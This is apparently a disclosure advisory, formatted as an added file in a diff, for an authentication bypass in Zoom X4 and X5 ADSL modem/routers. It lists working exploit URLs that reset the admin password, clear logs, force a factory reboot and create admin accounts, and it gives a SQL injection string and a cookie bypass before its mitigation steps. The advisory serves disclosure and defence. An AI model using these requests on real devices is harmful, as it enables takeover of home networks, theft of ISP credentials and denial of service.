@@ -1,0 +1,95 @@
+Vulnerable Products -
+
+Zoom X4 ADSL Modem and Router running Nucleus/4.3
+UPnP/1.0Virata-EmWeb/R6_2_0 Server All GS Firmware versions
+Zoom X5 ADSL Modem and Router running Nucleus/4.3
+UPnP/1.0Virata-EmWeb/R6_2_0 Server All GS Firmware versions
+
+Note: A similar vulnerability was reported several years ago on the
+Zoom X3 ADSL Modem using a SOAP API call. Many of these
+vulnerabilities affect X3 in the same manner, without needing to use a
+SOAP API.
+
+===================================
+
+Vulnerability-
+When UPnP services and WAN http administrative access are enabled,
+authorization and credential challenges can be bypassed by directly
+accessing root privileged abilities via a web browser URL.
+
+All aspects of the modem/router can be changed, altered and controlled
+by an attacker, including gaining access to and changing the PPPoe/PPP
+ISP credentials.
+
+====================================
+
+Timeline with Vendor-
+Have had no response from Zoom Telephonics since first reporting the
+problem on June 28. Subsequent emails have been sent with no response.
+
+Root Cause Observed-
+-As in most IGD UPnP routers and modems, where root vulnerabilities
+are prevalent, these modems contain the same privileged tunnel between
+either side of the router to be traversed without authentication.  The
+code and layout of the device plays a large role as well.
+
+Code/Script Vulnerabilities-
+
+-Form tags and actions ids usually hidden are easily seen from the
+html source, no sanitization of client side input is occurring and
+root overrides such as 'Zadv=1' can be invoked by any user.
+
+-No cookie authentication is done once several of the first bypass is
+executed, allowing for "Cookie: sessionId=invalid" to pass admin commands.
+
+-The SQL injection UNION SELECT 1,2,3,4,5,6,7-- added to the end of
+any URL page calling a table value, such as /MainPage?id=25, will
+bring up the system status page, with each interface visible and
+selectable.
+
+Patches or Fixes-
+At this time, there are no known patches or fixes.
+
+Vulnerability proofs and examples-
+All administrative items can be accessed through these two URLs
+
+--Menu Banner
+http://<IP>/hag/pages/toc.htm
+
+-Advanced Options Menu
+http://<IP>/hag/pages/toolbox.htm
+
+Example commands that can be executed remotely through a web browser
+URL, or a modified HTTP GET/POST requests-
+
+-Change Password for admin Account
+
+On Firmware 2.5 or lower
+http://<IP>/hag/emweb/PopOutUserModify.htm/FormOne&user=admin&ex_param1=admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes
+
+On Firmware 3.0-
+http://<IP>/hag/emweb/PopOutUserModify.htm?id=40&user=admin&Zadv=1&ex_param1=admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes
+
+-Clear Logs
+http://<IP>/Action?id=76&cmdClear+Log=Clear+Log
+
+-Remote Reboot to Default Factory Settings-
+Warning - For all intents and purposes, this action will almost always
+result in a long term Denial of Service attack.
+http://<IP>/Action?reboot_loc=1&id=5&cmdReboot=Reboot
+
+-Create New Admin or Intermediate Account-
+On Firmware 2.5 or lower
+http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&user_id="newintermediateaccount"&priv=v2&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes
+
+On Firmware 3.0-
+http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=adminuser_id="newadminaccount"&priv=v1&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes
+
+Mitigation and Workarounds-
+Adv.Options --> UPnP --> --> Disable UPnP --> Write Settings to Flash --> Reboot
+Adv.Options --> Firewall Configuration --> Enable 'Attack Protection'
+'DOS Proctection''Black List'--> Write Settings to Flash
+Adv.Options --> Management Control --> Disable WAN Management from all
+fields -->  Write Settings to Flash
+Always change the default Username and Password, though this will
+nothelp mitigate this vulnerability
